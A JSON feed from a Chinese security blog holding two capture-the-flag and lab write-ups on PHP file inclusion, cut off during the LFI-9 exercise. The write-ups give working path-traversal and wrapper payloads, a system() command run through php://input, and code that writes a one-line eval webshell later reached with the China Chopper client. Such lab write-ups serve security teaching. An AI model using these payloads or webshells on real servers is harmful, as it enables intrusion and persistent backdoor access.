{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"文件包含探究\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "title": "文件包含进阶（二）",
            "date_published": "2022-10-20T15:55:08.000Z",
            "content_html": "<h1 id=\"文件包含进阶二\"><a class=\"markdownIt-Anchor\" href=\"#文件包含进阶二\">#</a> 文件包含进阶（二）</h1>\n<p>本篇讲述伪协议相关内容</p>\n<h1 id=\"php伪协议php\"><a class=\"markdownIt-Anchor\" href=\"#php伪协议php\">#</a> php 伪协议 php://</h1>\n<p>php:// — 访问各个输入 / 输出流（I/O streams）</p>\n<h2 id=\"说明\"><a class=\"markdownIt-Anchor\" href=\"#说明\">#</a> 说明</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h3 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"markdownIt-Anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h3>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 <strong> <code>STDIN</code> </strong> 并不受影响。 推荐你简单使用常量 <strong> <code>STDIN</code> </strong>、 <strong> <code>STDOUT</code> </strong> 和 <strong> <code>STDERR</code> </strong> 来代替手工打开这些封装器。</p>\n<p>php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。</p>\n<h3 id=\"phpinput\"><a class=\"markdownIt-Anchor\" href=\"#phpinput\">#</a> php://input</h3>\n<p>php://input 是个可以访问请求的原始数据的只读流。  <code>enctype=&quot;multipart/form-data&quot;</code>  的时候 php://input 是无效的。</p>\n<h3 id=\"phpoutput\"><a class=\"markdownIt-Anchor\" href=\"#phpoutput\">#</a> php://output</h3>\n<p>php://output 是一个只写的数据流， 允许你以 <a href=\"https://www.php.net/manual/zh/function.print.php\">print</a> 和 <a href=\"https://www.php.net/manual/zh/function.echo.php\">echo</a> 一样的方式 写入到输出缓冲区。</p>\n<h3 id=\"phpfd\"><a class=\"markdownIt-Anchor\" href=\"#phpfd\">#</a> php://fd</h3>\n<p>php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</p>\n<h3 id=\"phpmemory-和-phptemp\"><a class=\"markdownIt-Anchor\" href=\"#phpmemory-和-phptemp\">#</a> php://memory 和 php://temp</h3>\n<p>php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 <a href=\"https://www.php.net/manual/zh/function.sys-get-temp-dir.php\">sys_get_temp_dir()</a> 的方式一致。</p>\n<p>php://temp 的内存限制可通过添加  <code>/maxmemory:NN</code>  来控制， <code>NN</code>  是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>\n<h3 id=\"phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#phpfilter\">#</a> php://filter</h3>\n<p>php://filter 是一种元封装器， 设计用于数据流打开时的<a href=\"https://www.php.net/manual/zh/filters.php\">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href=\"https://www.php.net/manual/zh/function.readfile.php\">readfile()</a>、 <a href=\"https://www.php.net/manual/zh/function.file.php\">file()</a> 和 <a href=\"https://www.php.net/manual/zh/function.file-get-contents.php\">file_get_contents()</a>， 在 <code>数据流内容读取</code> 之前没有机会应用其他过滤器。</p>\n<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>\n<p><strong>php://filter 参数</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">名称</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><code>resource=&lt;要过滤的数据流&gt;</code></td>\n<td style=\"text-align:left\">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>read=&lt;读链的筛选列表&gt;</code></td>\n<td style=\"text-align:left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（ <code>|</code> ）分隔。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>write=&lt;写链的筛选列表&gt;</code></td>\n<td style=\"text-align:left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（ <code>|</code> ）分隔。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;；两个链的筛选列表&gt;</code></td>\n<td style=\"text-align:left\">任何没有以  <code>read=</code>  或  <code>write=</code>  作前缀 的筛选器列表会视情况应用于读或写链。</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"第一题-bugku-文件包含\"><a class=\"markdownIt-Anchor\" href=\"#第一题-bugku-文件包含\">#</a> 第一题 Bugku - 文件包含</h1>\n<p>打开题目后映入眼帘的是一个超链接，显示要点击</p>\n<p><img src=\"image-20221020210102218.png\" alt=\"image-20221020210102218\"></p>\n<p>点击后发现是 <code>GET</code>  请求，参数是 <code>file</code> ，值是 <code>show.php</code> ，这很有文件包含的韵味。</p>\n<p><img src=\"image-20221020210129622.png\" alt=\"image-20221020210129622\"></p>\n<p>本题，我们要使用的是 <code>php://filter</code> ，说白了就是<strong>为了读取文件</strong>用的。</p>\n<p><strong>示例  php://filter/read=&lt;读链需要应用的过滤器列表&gt;</strong></p>\n<p>这个参数采用一个或以管道符  <code>|</code>  分隔的多个过滤器名称。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/* 这会以大写字母输出 www.example.com 的全部内容 */</span><br><span class=\"line\">readfile(&quot;php://filter/read=string.toupper/resource=http://www.example.com&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">/* 这会和以上所做的一样，但还会用 base64 加密。 */</span><br><span class=\"line\">readfile(&quot;php://filter/read=string.toupper|string.base64/resource=http://www.example.com&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>由于前台的代码我们是可以看得到的，后台代码我们能看得到么？</p>\n<p>可以，前提是存在 <code>文件包含漏洞</code> ，且使用 GET 请求。</p>\n<p>然后使用 <code>php://filter/read=</code> ，配合 <code>conver.base64-encode/resource=xxxxx</code>  来提取后台的代码内容</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://114.67.175.224:11146/index.php?file=php://filter/read=convert.base64-encode/resource=show.php</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">77u/PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LXdlYjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFnezRjMTVlZGZmZGEwNDkyYWI2MDM2OTA2NTVmNTUzZDdifQ0KPz4NCjwvaHRtbD4NCg== </span><br></pre></td></tr></table></figure>\n<p>解码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">ï»¿&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"variable\">$_GET</span>[file])&#123;<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class=\"line\">\t<span class=\"variable\">$file</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;../&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&quot;tp&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;input&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;data&quot;</span>))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Oh no!&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>); </span><br><span class=\"line\"><span class=\"comment\">//flag:flag&#123;4c15edffda0492ab603690655f553d7b&#125;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>flag 已经出来：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;4c15edffda0492ab603690655f553d7b&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"第二题-php-input命令执行\"><a class=\"markdownIt-Anchor\" href=\"#第二题-php-input命令执行\">#</a> 第二题 php input 命令执行</h1>\n<p>点击 <code>click</code>  后会跳转到百度</p>\n<p><img src=\"image-20221020215322462.png\" alt=\"image-20221020215322462\"></p>\n<p>我们发现 URL 很特殊：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<p><code>GET</code>  请求，后面跟着一个 <code>URL</code> ，我们怀疑其存在文件包含漏洞。</p>\n<p>尝试输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=php://filter/read</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020215459804.png\" alt=\"image-20221020215459804\"></p>\n<p>显示 <code>hacker!</code> ，说明 <code>filter</code>  伪协议被过滤掉了，不能用</p>\n<p>我们使用 <code>input</code>  伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=php://input</span><br><span class=\"line\"></span><br><span class=\"line\">#发送POST请求，在POST参数里写上php代码</span><br><span class=\"line\">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020215715688.png\" alt=\"image-20221020215715688\"></p>\n<p>既然 phpinfo 成功执行，那么可以执行任意 php 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=php://input</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php system(&quot;dir&quot;);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020215836378.png\" alt=\"image-20221020215836378\"></p>\n<p>使用 <code>php</code>  语句写入一个带一句话木马的文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.lfi.com/php/php_input.php?file=php://input</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#注意，下面写入一句话时，所用都使用单引号，特别是第二个参数不要用双引号</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;mywebshell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>), <span class=\"string\">&#x27;&lt;?php @eval($_POST[jack]);?&gt;&#x27;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用菜刀连接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/mywebshell.php</span><br></pre></td></tr></table></figure>\n<p>找到 <code>flag.php</code></p>\n<p><img src=\"image-20221020221400926.png\" alt=\"image-20221020221400926\"></p>\n<h1 id=\"第三题-zip协议\"><a class=\"markdownIt-Anchor\" href=\"#第三题-zip协议\">#</a> 第三题 zip 协议</h1>\n<p>打开第三题，我们发现是一个和上传有关的界面</p>\n<p><img src=\"image-20221020222841751.png\" alt=\"image-20221020222841751\"></p>\n<p>根据提示，我们可以上传 <code>jpg</code> 、 <code>png</code> 、 <code>zip</code></p>\n<p>那么我们选择上传一个包含有 <code>webshell.php</code>  的 <code>jpg</code>  压缩包</p>\n<p>将其打包后，把 <code>rar</code>  后缀改成 <code>jpg</code></p>\n<p><img src=\"image-20221020223009765.png\" alt=\"image-20221020223009765\"></p>\n<p>点击上传，发现后台已经成功接收。</p>\n<p><img src=\"image-20221020223343170.png\" alt=\"image-20221020223343170\"></p>\n<p>不过我们的目的是让其解析里面的 php 代码，我们需要使用到 zip 协议</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_zip.php?file=zip://C:\\phpStudyB\\WWW\\lfi-labs-master\\php\\uploads\\115a2563174161e1c5176e556e167ff8.jpg%23mywebshell</span><br></pre></td></tr></table></figure>\n<p>注意：使用 zip 协议时，无论上传的后缀名如何，都会当成一个 zip 看待。</p>\n<p>使用菜刀连接即可</p>\n<h1 id=\"第四题-data协议\"><a class=\"markdownIt-Anchor\" href=\"#第四题-data协议\">#</a> 第四题 data 协议</h1>\n<p>有文件包含漏洞， <code>GET</code>  请求，参数为 <code>file </code> ，我们尝试使用 <code>data</code>  协议插入 <code>php</code>  代码执行</p>\n<p>注意，data 协议有两种用法：</p>\n<ul>\n<li><code>data://text/plain, + 你想写入的php代码</code></li>\n<li><code>data://text/plain;base64, + xxxxxxxxx代码的base64编码xxxxxxxxx</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_data.php?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020230032370.png\" alt=\"image-20221020230032370\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_data.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>\n<p>也是可以的。</p>\n<h1 id=\"第五题-利用操作系统特性绕过\"><a class=\"markdownIt-Anchor\" href=\"#第五题-利用操作系统特性绕过\">#</a> 第五题 利用操作系统特性绕过</h1>\n<p>在上传 <code>backdoor.php</code>  的时候，如果在后台中被强行加了个 <code>.html</code>  这样的后缀时</p>\n<p>我们可以考虑使用 <code>........</code> (256 个 <code>.</code> ) 和  <code>././././././</code> ( <code>128</code>  个 <code>./</code> ) 这样的形式进行绕过</p>\n<p>因为在 windows 中，不允许文件以 <code>.</code>  和 <code>/</code>  进行结尾，且长度最大为 <code>256</code> （ <code>linux</code>  是 <code>4069</code> ）。</p>\n",
            "tags": [
                "文件包含探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "文件包含进阶（一）",
            "date_published": "2022-10-20T15:49:56.000Z",
            "content_html": "<h1 id=\"文件包含漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h1>\n<h2 id=\"lfi-1\"><a class=\"markdownIt-Anchor\" href=\"#lfi-1\">#</a> LFI-1</h2>\n<p>查看后台源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>     <span class=\"keyword\">include</span>(<span class=\"string\">&quot;../common/header.php&quot;</span>);   <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- <span class=\"keyword\">from</span> https:<span class=\"comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">hint</span>(<span class=\"string\">&quot;will include the arg specified in the GET parameter \\&quot;page\\&quot;&quot;</span>); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form action=<span class=\"string\">&quot;/LFI-1/index.php&quot;</span> method=<span class=\"string\">&quot;GET&quot;</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;text&quot;</span> name=<span class=\"string\">&quot;page&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;page&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>请求 form 表单， <code>GET</code>  方式，请求 <code>index.php</code>  时，会调用 php 的 <code>include($_GET[&quot;page&quot;].&quot;.html&quot;);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.lfi.com/LFI-1/?page=../phpinfo.php</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019234908422.png\" alt=\"image-20221019234908422\"></p>\n<h2 id=\"lfi-2\"><a class=\"markdownIt-Anchor\" href=\"#lfi-2\">#</a> LFI-2</h2>\n<p>参数是 <code>library</code></p>\n<p>由于 Hint 是 %00 截断，那么我们尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../boot.ini%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020000125556.png\" alt=\"image-20221020000125556\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../phpinfo.php%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020000057865.png\" alt=\"image-20221020000057865\"></p>\n<p>那么我们可以任意文件包含，去包含 webshell.php</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../webshell.php%00</span><br></pre></td></tr></table></figure>\n<p>使用菜刀连接：</p>\n<p><img src=\"image-20221020000532196.png\" alt=\"image-20221020000532196\"></p>\n<p>从这题可以看到，文件包含本质是利用文件包含 <code>include</code> 、 <code>require</code>  等漏洞来进行<strong>文件上传</strong>或<strong>文件访问</strong></p>\n<h2 id=\"lfi-3\"><a class=\"markdownIt-Anchor\" href=\"#lfi-3\">#</a> LFI-3</h2>\n<p>查看 Hint</p>\n<p><img src=\"image-20221020000927815.png\" alt=\"image-20221020000927815\"></p>\n<p>查看后台源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>], -<span class=\"number\">4</span>, <span class=\"number\">4</span>) != <span class=\"string\">&#x27;.php&#x27;</span>)<span class=\"comment\">//从结尾倒数第四个开始，取4个长度</span></span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are not allowed to see source files!&#x27;</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>代码核心逻辑讲了：</p>\n<p>从 <code>GET</code>  获取到的 <code>file</code>  参数内容里截取倒数第 4 个开始，取 4 个长度的子字符串</p>\n<p>将此字符串和 <code>.php</code>  (4 个字符) 进行比较 ——</p>\n<ul>\n<li>如果相等则显示 “You are not allowed to see source files!”</li>\n<li>否则调用 <code>file_get_contents</code>  显示文件内容，或者如果是 <code>php</code>  的话前台浏览器会解析 <code>php</code>  代码</li>\n</ul>\n<p>那么，利用点就是 <code>过掉这个if条件判断</code> 。</p>\n<p>首先，我们先确定相对路径：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../boot.ini</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020001601472.png\" alt=\"image-20221020001601472\"></p>\n<p>然后将 <code>boot.ini</code>  替换成 <code>phpinfo.php</code> ，注意加 <code>/.</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php/.</span><br></pre></td></tr></table></figure>\n<p>查看页面源代码，成功解析 php 代码：</p>\n<p><img src=\"image-20221020002018746.png\" alt=\"image-20221020002018746\"></p>\n<p>理论上，可以用任何多余特殊字符绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php.</span><br><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php+</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>均成功解析 php</p>\n<h2 id=\"lfi-4\"><a class=\"markdownIt-Anchor\" href=\"#lfi-4\">#</a> LFI-4</h2>\n<p>直接查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"string\">&#x27;includes/class_&#x27;</span>.<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;class&#x27;</span>]).<span class=\"string\">&#x27;.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>核心逻辑</strong>：</p>\n<p>拼接 <code>includes/class_</code>  + <code>经过addslashes处理的GET请求参数class</code>  +  <code>.php</code></p>\n<p>然后使用 <code>file_get_contents</code>  函数回显这个拼接路径文件</p>\n<p><strong>注意</strong>： <code>addslashes</code>  可以对 <code>双引号</code> 、 <code>单引号</code> 、 <code>反斜杠</code> 、 <code>NULL</code>  前面加一个 <code>反斜杠</code> 进行转义</p>\n<p>那么由于后面已经有 <code>.php</code> ，所以我们只需要构造 <code>phpinfo</code> ，并尝试相对路径：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-4/?class=../../../../../phpinfo</span><br></pre></td></tr></table></figure>\n<p>成功解析到 <code>php</code>  代码</p>\n<p><img src=\"image-20221020003703322.png\" alt=\"image-20221020003703322\"></p>\n<h2 id=\"lfi-5\"><a class=\"markdownIt-Anchor\" href=\"#lfi-5\">#</a> LFI-5</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;../&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;pages/<span class=\"subst\">$file</span>&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，此题将 <code>../</code>  过滤成 <code>空</code> ，一般过滤成空的，我们可以通过双写来绕过。</p>\n<p>那么有</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-5/?file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p>成功显示 <code>phpinfo</code>  界面</p>\n<p><img src=\"image-20221020004759481.png\" alt=\"image-20221020004759481\"></p>\n<h2 id=\"lfi-6\"><a class=\"markdownIt-Anchor\" href=\"#lfi-6\">#</a> LFI-6</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;page&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>核心逻辑：</p>\n<p>使用 <code>POST</code>  来传递参数，和 <code>LFI-1</code>  差不多。</p>\n<p><img src=\"image-20221020005136900.png\" alt=\"image-20221020005136900\"></p>\n<p>那么可以构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">page=../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020005213444.png\" alt=\"image-20221020005213444\"></p>\n<p>如何在服务器上写入一句话木马文件呢？</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;myshell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php @eval($_POST[JACK]);?&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010044983.png\" alt=\"image-20221020010044983\"></p>\n<p>后续使用菜刀连接即可。</p>\n<h2 id=\"lfi-7\"><a class=\"markdownIt-Anchor\" href=\"#lfi-7\">#</a> LFI-7</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library=../../../boot.ini%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010438974.png\" alt=\"image-20221020010438974\"></p>\n<p>构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library=../../../phpinfo.php%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010511820.png\" alt=\"image-20221020010511820\"></p>\n<h2 id=\"lfi-8\"><a class=\"markdownIt-Anchor\" href=\"#lfi-8\">#</a> LFI-8</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=../../../../phpinfo.php/.</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010823561.png\" alt=\"image-20221020010823561\"></p>\n<h2 id=\"lfi-9\"><a class=\"markdownIt-Anchor\" href=\"#lfi-9\">#</a> LFI-9</h2>\n<figure 